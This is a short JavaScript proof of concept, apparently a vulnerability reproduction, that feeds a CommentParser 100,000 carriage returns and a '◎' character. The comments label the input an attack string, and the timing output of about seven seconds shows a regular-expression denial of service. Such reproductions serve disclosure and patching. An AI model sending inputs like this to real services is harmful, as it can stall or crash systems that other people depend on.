import { CommentParser } from "./index.js";

//Attack String :""+"\r"*100000+"◎"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "\r";
}
str += "◎";

console.log(CommentParser.parse(str));

// real    0m6.847s
// user    0m6.798s
// sys     0m0.030s